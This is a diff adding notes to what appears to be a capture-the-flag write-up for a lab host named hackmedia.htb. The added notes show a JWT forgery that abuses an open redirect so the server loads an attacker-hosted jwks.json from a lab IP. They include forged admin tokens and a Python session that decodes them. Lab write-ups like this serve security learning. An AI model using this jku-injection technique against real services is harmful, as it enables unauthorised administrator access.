@@ -179,6 +179,8 @@ jwks.json
 }
 ````
 
+Using the function http://hackmedia.htb/redirect/?url=google.com it is possible to redirect the server to retrieve our JWT
+
 JWK and JWT
 ````java
 package com.company;
@@ -262,10 +264,25 @@ public class Main {
 }
 ````
 
+````
+>>> payload = "eyJqa3UiOiJodHRwOlwvXC9oYWNrbWVkaWEuaHRiXC9zdGF0aWNcLy4uXC9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNlwvandrcy5qc29uIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJ1c2VyIjoiYWRtaW4ifQ.XuHzSnUdJHFFGhKbH-j4uToX_F0cgTER03mtFbkSv_HuA2OqpdwqoKV8TDrSkTYX-SeKFeoGAl3JtvlGoqGTMUcYTZ0aVYCSQd88yZ39dI87Gf_mH24JTmK6-21IKpFUEbNpI3gcyRuUoucQUmcXQAUAhEWxVGE_Cc2juglSq0mnn_UcjLzo6HtcPJSrx2csA7_f5qVmv-_LkSOAuXyGY4Q93mMH_ttmvUv_kbY4rUgn5-H1DNhLm1JeVC18DJ-uA5RsKc9WReVbH3zIfkE8RAScSZulxW2n44RGQgBjwkvlorPdmBlAaMQDOOrGSCjtqYAz6sTYjlvYG9Qpq-bDWQ"
+>>> 
+>>> jwt.get_unverified_header(payload);
+{'jku': 'http://hackmedia.htb/static/../redirect?url=10.10.15.6/jwks.json', 'typ': 'JWT', 'alg': 'RS256'}
+>>> jwt.decode(payload, options={"verify_signature": False})
+{'user': 'admin'}
+````
 
 
+
+````
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.rhyqiURChTIPRQ0Lih_NnK56GzVgosn-N3l5u8R0s3CKo61Y3H-GcLRxrvXEHoWuKuwFQmU2rGzsZjmM_Jj8OsbwZc8-nQZJvIDl1fH7I4nMpph-MrXVJHiN9saRvByji6DQgQMcHYgfoH6SfeblGc9ta_MDFkW7ju1njpIB3OU8W8giNP2ZUC_y2RE8SezWi5FcrzNH8WYKRiHbUNovEGK-ACeUZDo4nxbUGPQabEAtDE6nlE7nSfQLcK0RdSTMQ4mSeDajdOHDPyCo1XrzS_I42h8bRJ_y0H50805Yee2v4fslsNlPvq19__TeYpuHEZRbTZ0MU7UL07Oxiy7ykg
+````
 
 
 # Root
 
 # Secrets
+
+
+https://connect2id.com/products/nimbus-jose-jwt/examples
